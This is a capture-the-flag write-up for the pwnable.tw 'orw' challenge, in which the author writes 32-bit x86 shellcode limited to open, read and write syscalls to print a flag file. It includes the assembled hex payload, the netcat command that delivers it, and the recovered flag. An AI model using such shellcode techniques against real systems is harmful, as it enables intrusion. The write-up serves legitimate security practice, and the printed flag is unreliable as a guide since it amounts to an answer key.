# orw

> Read the flag from `/home/orw/flag`.
>
> Only `open` `read` `write` syscalls are allowed to use.
>
> `nc chall.pwnable.tw 10001`

Looks like I got a 32-bit 80386 ELF.

```
$ file orw 
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

On execution, the program asks for a shellcode, which I suppose it will execute. I didn't want to just assume the program does what it says, so checked it out in Ghidra first.

![](https://imgur.com/iUurP1b.png)

So it seemed like I indeed just needed to craft a shellcode payload that reads and prints the flag file, which should be possible with only the given instructions. I tried to write the following calls:

```
fd = open("/home/orw/flag", 0_RDONLY, 0)
read(fd, shellcode-40, 40)
write(stdout, shellcode-40, 40)
```

That's opening the flag file, then reading it, then writing that to standard output. I used the address of the shellcode minus 40 bytes to store the flag. That seemed like a safe option and it wouldn't impact the shellcode being executed. I found this address, `0x804a060`, using GDB.
I wrote this payload assembly first, in `payload.asm`. I then used an online x86 compiler and got the following result:

```
\xB8\x05\x00\x00\x00\x6A\x00\x68\x66\x6C\x61\x67\x68\x77\x2F\x2F\x2F\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x50\x5B\xB8\x03\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9\x28\xBA\x28\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9\x28\xBA\x28\x00\x00\x00\xCD\x80
```

This worked:

```
$ echo "\xB8\x05\x00\x00\x00\x6A\x00\x68\x66\x6C\x61\x67\x68\x77\x2F\x2F\x2F\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x50\x5B\xB8\x03\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9\x28\xBA\x28\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9\x28\xBA\x28\x00\x00\x00\xCD\x80" | nc chall.pwnable.tw 10001
Give my your shellcode:FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
```
